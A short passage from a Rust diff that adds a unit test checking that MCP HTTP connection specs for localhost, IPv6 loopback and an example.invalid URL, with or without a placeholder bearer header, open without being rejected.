+            ("http://localhost:9/mcp", true),
+            ("http://[::1]:9/mcp", true),
+            ("http://example.invalid/mcp", false),
+        ] {
+            let spec = http_spec("x", url, 2000);
+            let spec = if header {
+                with_header(spec, "Authorization", "Bearer s3cret")
+            } else {
+                spec
+            };
+            assert!(open_conn(&spec).is_ok(), "{} 不应被拒", url);
+        }
     }
 }
